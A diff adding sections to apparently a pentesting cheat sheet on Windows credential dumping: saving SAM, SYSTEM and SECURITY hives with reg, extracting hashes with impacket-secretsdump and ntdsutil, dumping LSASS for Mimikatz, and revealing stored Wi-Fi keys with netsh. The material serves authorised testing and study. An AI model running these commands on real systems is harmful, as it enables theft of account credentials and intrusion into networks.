@@ -805,6 +805,71 @@ Backups of these files may exist in the `C:\Windows\Repair` or `C:\Windows\Syste
    hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
    ```
 
+Alternatively, save SAM, SYSTEM, and SECURITY with registry:
+
+```text
+reg save hklm\sam c:\SAM
+reg save hklm\system c:\SYSTEM
+reg save hklm\security c:\SECURITY
+```
+
+Alternatively, we can use `impacket-secretsdump`:
+
+```text
+impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL
+```
+
+### Dump NTDS Database
+
+#### ndtsutil
+
+The ntdsutil utility can be used to backup the database:
+
+```text
+ntdsutil "ac in ntds" i "cr fu c:\temp" q q
+```
+
+#### impacket-secretsdump
+
+Alternatively, you can use `impacket-secretsdump`, however, for this, you need the NTDS:
+
+```text
+impacket-secretsdump -ntds ntds -system SYSTEM LOCAL
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
+```
+
+### Dump LSASS Login Credentials
+
+The Local Security Authority Subsystem Service \(LSASS\) is a process responsible for enforcing security on a Windows system. By creating a memory dump of the process, we can extract plaintext credentials.
+
+With local administrator rights on a host, open task manager, find lsass.exe, right-click and select “Create Dump File”
+
+![Task Manager -&amp;gt; Details -&amp;gt; lsass.exe](../.gitbook/assets/image%20%2824%29.png)
+
+Create a dump file:
+
+![Create dump file](../.gitbook/assets/image%20%2823%29.png)
+
+Then you will receive this message:
+
+![Dumping process done](../.gitbook/assets/image%20%2826%29.png)
+
+Mimikatz can then dump the plaintext login credentials:
+
+```text
+sekurlsa::Minidump lsass.DMP
+sekurlsa::logonPasswords
+```
+
+### Dump Wi-Fi Passwords
+
+We can dump wi-fi passwords with netsh:
+
+```text
+netsh wlan show profiles
+netsh wlan show profile name="ConnectionName" key=clear
+```
+
 ### **Passing the Hash**
 
 Windows accepts hashes to authenticate to a number of services. We can use pth tools to perform a pass-the-hash in order to log in with the hash.
